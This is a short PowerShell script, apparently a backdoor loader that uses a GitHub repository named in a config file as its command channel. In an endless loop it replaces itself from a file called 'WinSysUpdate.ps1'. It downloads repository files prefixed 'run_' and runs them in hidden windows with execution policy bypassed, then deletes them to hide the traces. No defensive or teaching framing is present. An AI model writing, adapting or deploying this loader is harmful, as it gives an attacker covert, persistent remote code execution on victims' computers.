# --- UNIVERSAL WATCHER ---
$dir = Split-Path $MyInvocation.MyCommand.Path
$configFile = Join-Path $dir "config.txt"

if (Test-Path $configFile) {
    $conf = Get-Content $configFile
    $user = $conf[0].Trim()
    $repo = $conf[1].Trim()
    $url = "https://raw.githubusercontent.com/$user/$repo/refs/heads/main"
} else { exit }

while($true) {
    try {
        # 1. Self-Update
        $remote = Invoke-WebRequest -Uri "$url/WinSysUpdate.ps1" -UseBasicParsing -TimeoutSec 10 | Select-Object -ExpandProperty Content
        if ($remote -and $remote -ne (Get-Content $MyInvocation.MyCommand.Path -Raw)) {
            Set-Content -Path $MyInvocation.MyCommand.Path -Value $remote
            Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -WindowStyle Hidden
            exit
        }

        # 2. Check GitHub API
        $files = Invoke-RestMethod -Uri "https://api.github.com/repos/$user/$repo/contents/" -UseBasicParsing
        foreach ($f in $files) {
            $n = $f.name
            $u = $f.download_url

            if ($n -like "create_*") {
                $c = Invoke-WebRequest -Uri $u -UseBasicParsing | Select-Object -ExpandProperty Content
                Set-Content -Path (Join-Path $dir ($n -replace "create_","")) -Value $c
            }

            if ($n -like "run_*") {
                $p = Join-Path $dir $n
                # Stáhneme soubor (přepíšeme existující, pokud tam je)
                Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
                
                # Spustíme bez čekání (-Wait odstraněno pro stabilitu)
                if ($n -like "*.bat") { 
                    Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden
                }
                elseif ($n -like "*.ps1") { 
                    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$p`"" -WindowStyle Hidden
                }

                # Počkáme 2 sekundy a pak zkusíme smazat
                Start-Sleep -Seconds 2
                if (Test-Path $p) { Remove-Item -Path $p -Force -ErrorAction SilentlyContinue }
            }
        }
    } catch { }
    Start-Sleep -Seconds 30
}
